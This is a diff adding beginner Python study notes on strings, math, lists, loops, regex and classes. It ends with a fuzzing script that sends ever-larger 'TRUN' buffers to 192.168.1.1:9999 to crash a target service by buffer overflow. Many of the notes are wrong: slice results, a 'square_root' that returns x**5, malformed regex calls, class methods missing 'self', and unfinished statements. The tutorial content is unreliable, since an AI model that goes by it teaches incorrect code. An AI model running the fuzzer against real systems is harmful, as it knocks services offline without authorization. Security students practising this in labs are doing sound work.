@@ -1,0 +1,158 @@
+Python Language
+
+#comment
+print("String")
+print('Hello, world!')
+print(""" This is a 
+	  multi - line 
+	  String!!!!! """)
+print("This is " + " a string")
+print('ln') #new line
+
+#math
+print(50 + 50) #100
+print(50 - 50) #0
+print(50 * 50) #2500
+print(50 / 50) #1
+print(50 ** 2) #power
+print(50 % 2) #modulus
+print(50 // 6) #8 int value
+
+#variables & functions:
+
+quote = "All is fair love and war"
+print(len(quote)) #length
+print(quote.upper()) #uppercase
+print(quote.lower()) #lowercase
+print(quote.title()) #uppercase every first letter of a word
+print(quote.strip()) #remove useless spaces
+print(quote.replace('d', 'D')) and ==> anD
+print(quote.swapcase()) ==> aLL IS FAIR LOVE ANd WAR
+
+name = "Heal"
+age = 27 #int
+gpa = 3.7 #float
+print(int(age)) #27
+print(int(29.5)) #29
+print("My name is " + name) #concatenation
+birth = 1
+age += birth
+print(int(age)) #28
+
+def who_am_I():
+	name = "Health"
+	age = 29
+	print("My name is " + name + " and I am " + str(age) + " years old")
+#usage who_am_I()
+
+def add_one_hundred(num):
+	print(num + 100)
+
+#usage add_one_hundred(5) #105
+
+def add(x,y):
+	print(x + y)
+
+#usage add(7,7) #14
+
+def multiply(x,y):
+	return x * y
+
+#usage multiply(7,7) #49
+
+def square_root(x):
+	return x**5
+
+#lists:
+name = ["John", "Jason", "Ali"]
+print(name[0]) #John
+print(name[1:2]) #index1 and index2 ==> Jason Ali
+print(name[0:2]) #from 0 to 2 ==> John Jason Ali
+print(name[1:]) #from 1 to the end
+print(name[:2]) #till index 2
+print(name[-1]) #last index - 1 ==> John Jason
+print(len[name]) #3
+name.append("Louay") add Louay to the end of the array
+name.pop() #remove the last index of the array (Louay)
+zip(array1, array2) #to combine two arrays
+
+loops:
+for n in name:
+	print(n)
+	print('\n')
+#John
+#Jason
+#Ali
+
+#while loop
+i = 1
+while i <= 10:
+	print(i)
+	i += 1
+# 1 2 3 4 5 6 7 8 9 10
+
+#Regex:
+import re
+
+str = "ElouayE"
+for i in str:
+	if re.search('E', i):
+		print(i, end=" ")
+
+for i in myFile:
+	match = re.search('(L|l)ouay', i) #match it once
+	if match:
+		print(match.group(), end=" ")
+
+#IGNORECASE
+for i in myFile:
+	if re.search('(L)ouay', re.IGNORECASE):
+		print(i, end=" ")
+
+#numerate
+for num, i in enumerate("Louay")
+
+#classes:
+
+class class_name:
+	def function():
+		print(n)
+
+to iniate a var and define it to class as example ==>  dog = animal()
+
+constructor:
+
+class animal:
+	def __init__(self)
+
+class person:
+	def __init__(self, name):
+		self.name = name
+
+	def set_name(name):
+		self.name = name
+
+	def get_name():
+		return self.name
+
+
+#Libraries:
+
+Script 1:
+import sys, socket
+#sys to get access to command lines, systems specific parameters and functions using sys.platform (win32 ==> windows, linux ==> Linux and darwin ==> macOS), I/O streans using sys.stdin, sys.stdout and sys.stderr for input output and errors
+#socket to create network socket(interfaces) and perfoming networking tasks as establishing connections sending and recieving packets ==> AF_INET(ipv4), AF_INET6(ipv6), SOCK_STREAM(TCP), SOCK_DGRAM(UDP)
+from time import sleep
+#sleep suspends execution of the current thread for a specified number of seconds
+buffer = "A" * 100 #sets the buffer size as A 100 times to try the buffer overflow on the targeted device
+while True: #infinite loop 
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creating socket using ipv4 and tcp protocols
+		s.connect(('192.168.1.1', 9999)) #establishes connection on targeted ip(192.168.1.1) and port(9999)
+		s.send('TRUN /.:/' + buffer) #sends the payload if the connection is established
+		s.close() #ends connection
+		sleep(1) #sleeps the thread for 1 second after it is done
+		buffer = buffer + "A" * 100 #increases the payload
+	except:
+		print "fuzzing crashed at %s bytes" %(str(len(buffer))) #if crashed shows the number of bytes that crashed the targeted device at
+		sys.exit() #end the code
